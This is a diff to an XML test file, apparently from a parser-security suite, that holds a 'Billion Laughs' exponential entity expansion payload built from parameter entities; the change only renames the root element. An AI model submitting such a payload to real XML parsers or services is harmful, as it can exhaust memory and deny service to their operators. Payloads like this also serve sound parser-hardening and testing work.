@@ -4,7 +4,7 @@
 name: Billion Laughs Attack (PE Version)
 description: Exponential Entity Expansion ("Billion Laughs") Attack with Paramter Entities
 -->
-<!DOCTYPE data [
+<!DOCTYPE root [
   <!ENTITY % a "lol">
   <!ENTITY % a1 "%a;%a;%a;%a;%a;%a;%a;%a;%a;%a;">
   <!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
@@ -16,4 +16,4 @@ description: Exponential Entity Expansion ("Billion Laughs") Attack with Paramte
   <!ENTITY % a8 "%a7;%a7;%a7;%a7;%a7;%a7;%a7;%a7;%a7;%a7;">
   <!ENTITY % a9 "%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;">
 ]>
-<data>&a9;</data>
+<root>&a9;</root>
